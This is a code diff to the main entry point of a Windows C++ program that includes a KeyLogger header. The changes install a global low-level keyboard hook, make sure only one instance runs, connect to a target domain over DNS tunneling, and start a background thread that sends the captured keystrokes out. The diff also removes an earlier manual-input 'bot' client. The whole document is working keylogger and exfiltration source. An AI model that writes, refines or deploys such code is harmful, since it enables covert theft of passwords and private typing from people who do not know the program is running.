@@ -1,75 +1,75 @@
+#define WIN32_LEAN_AND_MEAN
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
-#define _CRT_SECURE_NO_WARNINGS
 
 #include "Network.h"
 #include "KeyLogger.h"
 #include <iostream>
-#include <string>
-
-using namespace std;
 
 int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
-    _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
-    [[maybe_unused]] HANDLE mutex = CreateMutex(nullptr, 0, MUTEX_NAME); // create an exclusive key
-    switch (GetLastError()) { // check if the program already exists
-    case ERROR_ALREADY_EXISTS:  // program already running
-        return TRUE; // close program
-    case ERROR_SUCCESS:  // program isn't already running
-    default:  // start just to be sure.
-        break;
+                   _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
+    
+    // Create mutex to ensure only one instance runs
+    HANDLE mutex = CreateMutex(nullptr, TRUE, MUTEX_NAME);
+    if (!mutex) {
+        return FALSE;
     }
-	
-    // establish connection
-    while ((connectionId = startConnection(TARGET.c_str())) == -1) {
-        Sleep(1000);  // sleep to prevent spamming
-        cout << "Failed to establish connection" << endl;
+    
+    if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        CloseHandle(mutex);
+        return TRUE;
     }
-    cout << "Connection ID: " << connectionId << endl;
-	
-    // global keyboard hook that calls processKey
-    _k_hook = SetWindowsHookEx(WH_KEYBOARD_LL, process_key, nullptr, 0); 
+    
+    // Establish connection via DNS tunneling
+    int retryCount = 0;
+    while ((connectionId = startConnection(TARGET_DOMAIN.c_str())) == -1) {
+        retryCount++;
+        Sleep(2000);
+        
+        // Prevent infinite loop
+        if (retryCount > 10) {
+            CloseHandle(mutex);
+            return FALSE;
+        }
+    }
+    
+    // Install global keyboard hook
+    _k_hook = SetWindowsHookEx(WH_KEYBOARD_LL, process_key, nullptr, 0);
+    if (!_k_hook) {
+        CloseHandle(mutex);
+        return FALSE;
+    }
+    
     keyboardLayout = GetKeyboardLayout(0);
-	
-    MSG msg;
-    // message loop
-    while (GetMessage(&msg, nullptr, 0, 0) > 0) {
-        // pass the key along, allowing to be used by other processes
-        TranslateMessage(&msg);
-        DispatchMessageW(&msg);	
+    
+    // Start sender thread for async data transmission
+    HANDLE hSenderThread = CreateThread(nullptr, 0, senderThread, nullptr, 0, nullptr);
+    if (!hSenderThread) {
+        UnhookWindowsHookEx(_k_hook);
+        CloseHandle(mutex);
+        return FALSE;
     }
-	
-    // end of program, if hook successful, unhook
+    
+    // Message loop - keeps the hook active
+    MSG msg;
+    while (GetMessage(&msg, nullptr, 0, 0) > 0) {
+        TranslateMessage(&msg);
+        DispatchMessageW(&msg);
+    }
+    
+    // Cleanup
+    shouldStopSender = true;
+    if (hSenderThread) {
+        WaitForSingleObject(hSenderThread, 5000);  // Wait max 5 seconds
+        CloseHandle(hSenderThread);
+    }
+    
     if (_k_hook) {
         UnhookWindowsHookEx(_k_hook);
     }
-	
-    // return msg.wParam;
-
     
-    cout << "=== DNS Tunnel Client (manual input mode) ===" << endl;
-    cout << "Bot ID: " << BOT_ID << endl;
-    cout << "Server: " << SERVER_IP << ":" << SERVER_PORT << endl;
-    cout << "Type lines and press Enter to send. Type 'exit' to quit." << endl << endl;
-
-    if (!InitializeConnection()) {
-        cerr << "Failed to initialize connection. Exiting..." << endl;
-        return 1;
+    if (mutex) {
+        CloseHandle(mutex);
     }
-
-    SendHeartbeat();
-
-    string line;
-    while (true) {
-        cout << "> ";
-        if (!getline(cin, line)) break;
-        if (line == "exit") break;
-        if (line.empty()) continue;
-        SendManualInput(line);
-    }
-
-    if (clientSocket != INVALID_SOCKET) closesocket(clientSocket);
-    WSACleanup();
-
-    cout << "Client exiting." << endl;
-    return msg.wParam;
+    
+    return static_cast<int>(msg.wParam);
 }
